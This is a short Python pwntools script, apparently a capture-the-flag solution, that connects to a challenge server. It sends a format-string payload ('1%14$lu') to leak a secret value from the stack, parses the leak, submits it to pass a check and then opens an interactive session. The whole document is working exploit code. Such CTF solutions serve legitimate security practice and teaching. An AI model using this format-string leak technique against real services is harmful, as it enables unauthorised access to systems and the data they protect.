#!/usr/bin/env python3
from pwn import *
import re

HOST = "chal.bearcatctf.io"
PORT = 20011

context.update(os="linux", arch="amd64")


def main():
    io = remote(HOST, PORT)

    io.recvuntil(b": ")
    io.sendline(b"1%14$lu")

    data = io.recvuntil(b"one more shot", drop=False)
    m = re.search(rb"1([0-9]{10,})", data)
    if not m:
        raise RuntimeError(f"could not parse leak from: {data!r}")
    secret = int(m.group(1))
    log.success(f"secret = {secret}")

    io.recvuntil(b": ")
    io.sendline(str(secret).encode())
    io.interactive()


if __name__ == "__main__":
    main()
